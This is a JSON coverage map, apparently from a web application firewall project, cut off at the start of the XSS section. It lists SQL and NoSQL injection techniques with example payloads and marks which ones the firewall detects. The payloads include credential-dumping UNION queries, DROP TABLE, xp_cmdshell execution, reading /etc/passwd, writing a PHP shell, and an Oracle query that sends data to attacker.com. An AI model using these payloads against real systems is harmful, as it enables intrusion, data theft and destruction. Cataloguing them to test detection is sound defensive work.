{
  "version": "2.0",
  "description": "Complete OWASP Top 10 Attack Techniques — WAF Coverage Map",
  "attacks": {
    "SQL Injection": {
      "owasp": "A03:2021",
      "severity": "CRITICAL",
      "techniques": [
        {"id":"SQLi-01","name":"Classic OR Bypass","example":"' OR '1'='1","covered":true},
        {"id":"SQLi-02","name":"UNION SELECT","example":"' UNION SELECT user,pass FROM users--","covered":true},
        {"id":"SQLi-03","name":"Time-based Blind (MySQL)","example":"' OR SLEEP(5)--","covered":true},
        {"id":"SQLi-04","name":"Time-based Blind (MSSQL)","example":"'; WAITFOR DELAY '0:0:5'--","covered":true},
        {"id":"SQLi-05","name":"Time-based Blind (PostgreSQL)","example":"'; SELECT pg_sleep(5)--","covered":true},
        {"id":"SQLi-06","name":"Time-based (Benchmark)","example":"' AND BENCHMARK(5000000,MD5(1))--","covered":true},
        {"id":"SQLi-07","name":"Stacked Queries DROP","example":"'; DROP TABLE users--","covered":true},
        {"id":"SQLi-08","name":"Stacked Queries EXEC","example":"'; EXEC xp_cmdshell('dir')--","covered":true},
        {"id":"SQLi-09","name":"Error-based (extractvalue)","example":"' AND extractvalue(1,concat(0x7e,version()))--","covered":true},
        {"id":"SQLi-10","name":"Error-based (updatexml)","example":"' AND updatexml(1,concat(0x7e,user()),1)--","covered":true},
        {"id":"SQLi-11","name":"Error-based (CONVERT)","example":"' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))","covered":true},
        {"id":"SQLi-12","name":"Error-based (floor+rand)","example":"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM users GROUP BY x)a)--","covered":true},
        {"id":"SQLi-13","name":"Out-of-band (load_file)","example":"' UNION SELECT LOAD_FILE('/etc/passwd')--","covered":true},
        {"id":"SQLi-14","name":"Out-of-band (INTO OUTFILE)","example":"' UNION SELECT '' INTO OUTFILE '/var/www/shell.php'--","covered":true},
        {"id":"SQLi-15","name":"Out-of-band (UTL_HTTP Oracle)","example":"'; EXEC utl_http.request('http://attacker.com/'||user)--","covered":true},
        {"id":"SQLi-16","name":"NoSQL $where","example":"{\"username\":{\"$where\":\"this.password.length>0\"}}","covered":true},
        {"id":"SQLi-17","name":"NoSQL $gt bypass","example":"{\"password\":{\"$gt\":\"\"}}","covered":true},
        {"id":"SQLi-18","name":"NoSQL $regex","example":"{\"username\":{\"$regex\":\"admin\"}}","covered":true},
        {"id":"SQLi-19","name":"Hex encoding bypass","example":"0x27206f7220313d31","covered":true},
        {"id":"SQLi-20","name":"CHAR() bypass","example":"CHAR(39)+OR+CHAR(49)=CHAR(49)","covered":true},
        {"id":"SQLi-21","name":"Comment-in-keyword","example":"UN/**/ION SEL/**/ECT","covered":true},
        {"id":"SQLi-22","name":"Double URL encoding","example":"%2527%20OR%25201%253D1","covered":true},
        {"id":"SQLi-23","name":"Boolean-based Blind","example":"' AND 1=1-- vs ' AND 1=2--","covered":true},
        {"id":"SQLi-24","name":"Information Schema enum","example":"' UNION SELECT table_name FROM information_schema.tables--","covered":true},
        {"id":"SQLi-25","name":"Second-order SQLi","example":"stored payload executed later","covered":false,"note":"Cannot detect without DB context"}
      ]
    },
    "Cross-Site Scripting (XSS)": {
